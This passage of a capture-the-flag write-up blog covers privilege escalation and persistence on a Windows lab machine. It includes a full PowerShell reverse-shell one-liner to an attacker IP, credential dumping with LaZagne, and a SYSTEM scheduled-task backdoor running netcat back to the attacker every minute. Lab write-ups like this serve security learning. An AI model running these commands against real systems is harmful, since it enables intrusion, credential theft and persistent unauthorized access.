+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e">#1. Use secure sring to pass our password and store in the $pass var:</span>
+</span></span><span style="display:flex;"><span>$pass = convertto-securestring <span style="color:#e6db74">&#39;BL00dstiLL3r#&#39;</span> -asplain -force
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#2. Pass our username:</span>
+</span></span><span style="display:flex;"><span>$username = <span style="color:#e6db74">&#34;bloodstiller&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#3. Pass username &amp; password into one var $cred:</span>
+</span></span><span style="display:flex;"><span>$cred = New-Object System.Management.Automation.PSCredential ($username, $pass)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#4. Run our Command passing it the &#34;Credential $credential&#34; arg + var:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Command:</span>
+</span></span><span style="display:flex;"><span>[<span style="color:#66d9ef">command</span>] -Credential $cred</span></span></code></pre></div>
+    
+</div>
+</li>
+</ul>
+</li>
+<li>
+<p>You might be tempted to try the below to simply read the file, however it won&rsquo;t work.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cat C:\Users\Administrator\Desktop\root.txt -Credential $cred</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-24-123652_.png">
+</figure>
+</li>
+<li>The error occurs because the FileSystem provider in PowerShell does not support passing credentials directly when accessing files using commands like <code>cat</code> (alias for <code>Get-Content</code>). Instead I need to modify the command:
+<ul>
+<li>Commands like <code>Get-Content</code> or <code>cat</code> directly interact with the file system in <strong>the current user’s context</strong>. The FileSystem provider <strong>does not support credentials for local file access</strong>.</li>
+<li>Simply specifying <code>-Credential</code> without creating a new session (or drive mapping) has no effect for these commands because local file access relies <strong>on the caller’s current security context</strong>.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I can however read it another way by running a subscript as that user</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { Get-Content -Path <span style="color:#e6db74">&#34;C:\Users\Administrator\Desktop\root.txt&#34;</span>}</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><strong>Why this works</strong>:
+<ul>
+<li><code>Invoke-Command</code>:
+<ul>
+<li>Spawns a session under the specified credentials. (the ones I provide)</li>
+<li>The command inside the <code>-ScriptBlock</code> executes in that session.</li>
+</ul>
+</li>
+<li><strong>Subcommand</strong> (e.g., <code>Get-Content</code>):
+<ul>
+<li>Runs as if it were invoked directly by the impersonated user, bloodstiller.</li>
+<li>Can access files and resources that the current user cannot.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>In action</strong>:</p>
+<ul>
+<li>
+<figure><img src="/ox-hugo/2024-12-24-125013_.png">
+</figure>
+
+<ol>
+<li>I can see I am the user <code>Phoebe</code></li>
+<li>I run the command to read the file in the context of my admin user <code>bloodstiller</code> which is successful and returns the flag (as this user is part of the admin group.)</li>
+<li>I try and read it in the context of <code>Phoebe</code> which is denied due not sufficient permissions.</li>
+</ol>
+<p>+Note+: The blurred parts are just empty lines I included to make the output easier to read.</p>
+</li>
+</ul>
+</li>
+<li>
+<p>I can then start a reverse shell in the context of the user <code>bloodstiller</code>.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Start-Process powershell -Credential $cred -ArgumentList <span style="color:#e6db74">&#39;-NoP -NonI -W Hidden -Exec Bypass -Command &#34;&amp; { $client = New-Object System.Net.Sockets.TCPClient(\&#34;10.10.14.80\&#34;,6666); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | % {0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2&gt;&amp;1 | Out-String); $sendback2 = $sendback + \&#34;PS \&#34; + (pwd).Path + \&#34;&gt; \&#34;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush(); }; $client.Close(); }&#34;&#39;</span></span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-24-131715_.png">
+</figure>
+
+<ul>
+<li>I can see that the user is <code>Phoebe</code>, but I get our shell in the context of the user <code>bloodstiller</code> who is in the administrators group as I passed it our credentials via the credentialed object.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-dot-persistence">4. Persistence:</h2>
+<h3 id="dumping-admin-hash-with-lazagne-dot-exe">Dumping Admin Hash with LaZagne.exe:</h3>
+<ul>
+<li>I upload <code>LaZagne.exe</code> with a python webserver.
+<ul>
+<li>I run it and dump the hashes on the system.
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-24-084730_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>I did try <code>psexec</code> however I could not find any valid shares running so this did not work.</li>
+<li>I have the hashes but cannot pass them, lets look at other options.</li>
+</ul>
+</li>
+</ul>
+<h3 id="adding-a-scheduled-task-to-call-back-out-to-us">Adding a Scheduled Task To Call Back Out to us:</h3>
+<p>This is one of my favorite techniques as I can just set the task and whenever I want start our listener.</p>
+<ul>
+<li>
+<p><code>schtasks /create /tn BkD00r /tr &quot;C:\xampp\htdocs\omrs\images\nc64.exe 10.10.14.80 4433 -e cmd&quot; /sc minute /mo 1 /ru system</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-24-134200_.png">
+</figure>
+
+<ul>
+<li><strong>Command Breakdown</strong>:
+<ol>
+<li><code>/sc minute</code>: Specifies that the task should run every minute.</li>
+<li><code>/mo 1</code>: Runs the task every 1 minute.</li>
+<li><code>/ru system</code>: Runs the task with System privileges.</li>
+<li><code>/tr</code>: Specifies the action to execute, in this case, running nc64.exe with the specified options.</li>
+</ol>
+</li>
+<li>+Note+: This techniques runs every 1 minute and calls out to my attack machine. This means that even if I disconnect I can turn on my listener again and it will call back out to em.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Shell Caught</strong>:</p>
+<ul>
+<li>As I can see I caught the shell disconnected, started my listener again and was re-connected again.
+<ul>
+<li><figure><img src="/ox-hugo/2024-12-24-134332_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>I now have two forms of persistence a user with admin privileges, albeit I need to follow the standard chain of web/reverse shell to then run commands in their context using a credentialed object or start our listener and get a system shell.</li>
+</ul>
+<h2 id="lessons-learned">Lessons Learned:</h2>
+<h3 id="what-did-i-learn">What did I learn?</h3>
+<ol>
+<li>I learned to just be persistent, again this is an easier box, but I was trying to rush it. Slow down and get it done properly.</li>
+</ol>
+<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
+<ol>
+<li>I tried to cred stuff the voting page and not the admin page initially, really need to stop seeing two fields for user input and trying to ram creds in there. So I learned to slow down and read.</li>
+</ol>
+<h2 id="sign-off">Sign off:</h2>
+<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
+<p>Until next time, hack the planet!</p>
+<p>– Bloodstiller</p>
+<p>– Get in touch bloodstiller at bloodstiller dot com</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        3457
+                    
+                </li>
+            
+
+
+            
+                <li>en</li>
+            
+
+            
+
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Dec 24 2024 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
